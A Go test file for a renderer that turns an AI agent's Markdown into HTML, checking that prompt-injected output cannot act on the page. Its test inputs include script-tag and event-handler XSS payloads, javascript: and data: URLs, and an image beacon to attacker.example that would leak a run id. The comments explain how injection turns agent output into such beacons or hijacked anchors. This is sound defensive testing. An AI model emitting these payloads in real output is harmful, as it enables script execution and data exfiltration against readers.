package web

// What an agent's prose may and may not become once it is HTML.
//
// Every input here is text a model could write, and every assertion is a
// boundary rather than a formatting preference: the rendering ones say the
// review is readable, the refusal ones say it cannot act on the page it is
// rendered into.

import (
	"strings"
	"testing"
)

func TestRenderProseRendersWhatModelsWrite(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		name  string
		input string
		want  string
	}{
		{"heading", "## Falsified — dropped", "<h2>Falsified — dropped</h2>"},
		{"bold", "**3 survived**", "<strong>3 survived</strong>"},
		{"inline code", "the `have_css` matcher", "<code>have_css</code>"},
		{"list", "- one\n- two", "<li>one</li>"},
		{"ordered list", "1. first\n2. second", "<ol>"},
		{"table", "| a | b |\n|---|---|\n| 1 | 2 |", "<td>1</td>"},
		{"blockquote", "> quoted", "<blockquote>"},
	} {
		if got := string(renderProse(test.input)); !strings.Contains(got, test.want) {
			t.Errorf("%s: rendered %q, want it to contain %q", test.name, got, test.want)
		}
	}
}

// TestRenderProseRefusesToActOnThePage is the security contract. Each case
// names the thing a prompt injection would be trying to do.
func TestRenderProseRefusesToActOnThePage(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		name    string
		input   string
		absent  []string
		present []string
	}{
		{
			name:   "script tags are not markup",
			input:  "<script>alert(1)</script>",
			absent: []string{"<script"},
		},
		{
			name:   "event handlers are not markup",
			input:  `<div onclick="steal()">hi</div>`,
			absent: []string{"onclick"},
		},
		{
			name:   "javascript URLs do not survive as hrefs",
			input:  "[click](javascript:alert(1))",
			absent: []string{"javascript:"},
		},
		{
			name:   "data URLs do not survive as hrefs",
			input:  "[click](data:text/html;base64,PHNjcmlwdD4=)",
			absent: []string{"data:text/html"},
		},
		{
			// The whole reason this renderer needed writing: an image is a
			// GET the browser makes on its own, so a beacon in a review would
			// report the reader to whoever wrote the prompt.
			name:    "images are never fetched",
			input:   "![leak](http://attacker.example/p.gif?run=7UEJWZND)",
			absent:  []string{"<img", "attacker.example/p.gif", "run=7UEJWZND"},
			present: []string{"image not loaded", "attacker.example", "leak"},
		},
		{
			// The replacement text is built FROM the image's own alt text and
			// destination, so it is model-authored too. Written as a "code"
			// string it would have been emitted verbatim — the substitution
			// would have become the injection.
			name:    "the image replacement is itself escaped",
			input:   "![<script>alert(1)</script>](http://attacker.example/p.gif)",
			absent:  []string{"<script"},
			present: []string{"image not loaded", "attacker.example"},
		},
		{
			name:    "links cannot reach back through the opener",
			input:   "[a](https://ok.example)",
			present: []string{`rel="noopener noreferrer nofollow"`, `href="https://ok.example"`},
		},
		{
			name:    "bare URLs are linked under the same terms",
			input:   "see http://ok.example/x for more",
			present: []string{`rel="noopener noreferrer nofollow"`},
		},
		{
			// The run page's own anchors are #step-N-name. An agent that can
			// mint ids can collide with them and hijack a shared link.
			name:   "headings mint no anchors",
			input:  "## Heading",
			absent: []string{"id="},
		},
	} {
		got := string(renderProse(test.input))

		for _, absent := range test.absent {
			if strings.Contains(got, absent) {
				t.Errorf("%s: rendered %q, which must not contain %q", test.name, got, absent)
			}
		}

		for _, present := range test.present {
			if !strings.Contains(got, present) {
				t.Errorf("%s: rendered %q, want it to contain %q", test.name, got, present)
			}
		}
	}
}

// TestRenderProseKeepsFencedCodeHighlighted covers what the old fence-only
// renderer did well, since replacing it must not lose that.
func TestRenderProseKeepsFencedCodeHighlighted(t *testing.T) {
	t.Parallel()

	got := string(renderProse("```go\nfunc main() {}\n```"))

	if !strings.Contains(got, "<pre") {
		t.Errorf("fenced code did not render as a block: %s", got)
	}

	// chroma emits inline styles from the site's own palette; without the
	// highlighter this would be bare text in a <pre>.
	if !strings.Contains(got, "<span style=") {
		t.Errorf("fenced code is not highlighted: %s", got)
	}
}

// TestRenderProseIsEmptyForEmptyInput keeps an answerless step from rendering
// an empty box that looks like something failed to load.
func TestRenderProseIsEmptyForEmptyInput(t *testing.T) {
	t.Parallel()

	for _, input := range []string{"", "   ", "\n\n"} {
		if got := renderProse(input); got != "" {
			t.Errorf("renderProse(%q) = %q, want empty", input, got)
		}
	}
}
